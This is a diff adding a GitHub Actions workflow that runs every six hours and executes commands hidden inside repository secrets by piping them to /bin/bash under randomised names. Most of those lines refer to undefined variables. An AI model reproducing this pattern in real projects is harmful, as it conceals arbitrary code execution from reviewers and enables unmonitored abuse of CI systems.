@@ -1,0 +1,25 @@
+name: chengdaolaijing
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengdaolaijing
+        env:
+          rtwd42384: ${{ secrets.rtwd42384 }}
+        run: |
+          echo $rtwd42384 | jq -r .oudwg03314 | /bin/bash
+          echo $k1481 | jq -r .zf41 | /bin/bash
+          echo $fdxgf268 | jq -r .y23605 | /bin/bash
+          echo $w06215 | jq -r .y3 | /bin/bash
+          echo $dmf03 | jq -r .ubd99249 | /bin/bash
+          echo $j07117 | jq -r .e6158 | /bin/bash
+          echo $tcc95923 | jq -r .i031 | /bin/bash
+          echo $js874 | jq -r .wp5759 | /bin/bash
+
